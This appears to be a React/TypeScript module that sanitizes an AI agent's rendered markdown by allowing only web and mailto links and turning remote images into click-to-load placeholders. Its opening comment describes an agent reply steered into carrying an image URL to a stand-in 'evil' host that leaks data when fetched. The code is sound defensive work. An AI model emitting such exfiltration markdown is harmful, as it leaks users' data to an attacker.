"use client";

/* #566 — safety layer for rendered agent markdown. A reply can be steered
   into carrying `![](https://evil/x?data=…)` (an auto-fetch is an
   exfiltration channel) or links on non-web schemes (`file:`, `smb:`,
   app handlers). So:
   - <a href> survives only for https:/http:/mailto: (plus streamdown's
     incomplete-link sentinel, so mid-stream links keep their styling) —
     everything else renders as its label text.
   - <img src> on http(s) renders as a click-to-load placeholder naming the
     host — the first fetch happens only on a deliberate click. data:/blob:/
     relative sources (attachments) render as before. */
import { ImageIcon } from "lucide-react";
import { type ComponentProps, useState } from "react";
import { harden } from "rehype-harden";
import rehypeSanitize, { defaultSchema } from "rehype-sanitize";
import { defaultRehypePlugins, type StreamdownProps } from "streamdown";
import { cn } from "../../lib/utils";

const SAFE_LINK_PROTOCOLS = new Set([
  "https:",
  "http:",
  "mailto:",
  /* Streamdown marks a half-typed link `streamdown:incomplete-link` while
     it streams in; keeping the scheme lets the renderer show its
     incomplete styling instead of flashing plain text. */
  "streamdown:",
]);

const isSafeLinkHref = (href: unknown): boolean => {
  if (typeof href !== "string") return false;
  try {
    return SAFE_LINK_PROTOCOLS.has(new URL(href).protocol);
  } catch {
    return false;
  }
};

type HastNode = {
  type?: string;
  tagName?: string;
  properties?: Record<string, unknown>;
  children?: HastNode[];
};

/* Any <a> whose href isn't an allowed scheme collapses to a <span> — the
   label text stays, the URL never renders. Runs after harden, whose
   built-in safeProtocols (irc:/ircs:/xmpp:/blob:) plus the sanitize
   schema's extras (tel:/streamdown:) can't be subtracted by config. */
const unwrapUnsafeLinks = () => (tree: HastNode) => {
  const walk = (node: HastNode) => {
    const kids = node.children;
    if (!kids) return;
    for (let i = 0; i < kids.length; i++) {
      const child = kids[i];
      if (
        child.type === "element" &&
        child.tagName === "a" &&
        !isSafeLinkHref(child.properties?.href)
      ) {
        kids[i] = {
          type: "element",
          tagName: "span",
          properties: {},
          children: child.children ?? [],
        };
      }
      walk(kids[i]);
    }
  };
  walk(tree);
};

/* Streamdown's own schema (rehype-raw → sanitize → harden), rebuilt so
   <img src> also admits data:/blob: — the stock schema strips them before
   harden's allowDataImages can see them, which broke attachment images.
   Every non-web link scheme is blocked at the tree (text-only: the label
   renders, never the URL). */
const sanitizeSchema = {
  ...defaultSchema,
  clobberPrefix: "",
  protocols: {
    ...defaultSchema.protocols,
    href: [...(defaultSchema.protocols?.href ?? []), "tel", "streamdown"],
    src: [...(defaultSchema.protocols?.src ?? []), "data", "blob"],
  },
  attributes: {
    ...defaultSchema.attributes,
    code: [...(defaultSchema.attributes?.code ?? []), "metastring"],
  },
};

export const safeMessageRehypePlugins: NonNullable<
  StreamdownProps["rehypePlugins"]
> = [
  defaultRehypePlugins.raw,
  [rehypeSanitize, sanitizeSchema],
  [
    harden,
    {
      // Prefixes stay wide open — the scheme, not the host, is the boundary.
      allowedLinkPrefixes: ["*"],
      allowedImagePrefixes: ["*"],
      allowedProtocols: ["https:", "http:", "mailto:", "streamdown:"],
      allowDataImages: true,
      linkBlockPolicy: "text-only",
      imageBlockPolicy: "text-only",
    },
  ],
  unwrapUnsafeLinks,
];

const isRemoteSrc = (src: string) =>
  /^https?:\/\//i.test(src) || src.startsWith("//");

/* data:image/…, blob: and cid: render inline; anything else carrying a
   scheme (irc:, file:, … — whatever slipped past harden) shows as alt text. */
const isInlineSrc = (src: string) =>
  /^(data:image\/|blob:|cid:)/i.test(src) || !/^[a-z][a-z0-9+.-]*:/i.test(src);

type SafeImageProps = ComponentProps<"img"> & { node?: unknown };

export const SafeImage = ({
  src,
  alt,
  className,
  node: _node,
  ...props
}: SafeImageProps) => {
  const [loaded, setLoaded] = useState(false);
  if (!src || typeof src !== "string") return null;
  if (isRemoteSrc(src)) {
    if (loaded) {
      return (
        <span className="my-2 inline-block" data-streamdown="image-wrapper">
          <img
            alt={alt}
            className={cn("max-w-full rounded-lg", className)}
            data-streamdown="image"
            src={src}
            {...props}
          />
        </span>
      );
    }
    let host = "";
    try {
      host = new URL(src, "https://placeholder.invalid").host;
    } catch {
      /* keep the generic label */
    }
    return (
      <button
        className={cn(
          "my-2 inline-flex max-w-full flex-wrap items-center gap-1.5 rounded-lg border border-border bg-muted/60 px-3 py-2 text-left text-muted-foreground text-xs transition-colors hover:bg-muted hover:text-foreground",
          className,
        )}
        data-streamdown="image-placeholder"
        onClick={() => setLoaded(true)}
        title={src}
        type="button"
      >
        <ImageIcon className="size-3.5 shrink-0" />
        <span className="font-medium">
          {host ? `Image from ${host}` : "Remote image"}
        </span>
        {alt ? <span className="truncate">· {alt}</span> : null}
        <span className="underline underline-offset-2">load</span>
      </button>
    );
  }
  if (!isInlineSrc(src)) {
    return (
      <span className="text-muted-foreground text-xs italic">
        {alt ? `[image: ${alt}]` : "[image]"}
      </span>
    );
  }
  return (
    <span className="my-2 inline-block" data-streamdown="image-wrapper">
      <img
        alt={alt}
        className={cn("max-w-full rounded-lg", className)}
        data-streamdown="image"
        src={src}
        {...props}
      />
    </span>
  );
};

/* The cast bridges streamdown's bundled @types/react to ours — identical
   runtime props, phantom Ref<> incompatibility under bun's isolated deps. */
export const safeMessageComponents = {
  img: SafeImage,
} as unknown as StreamdownProps["components"];
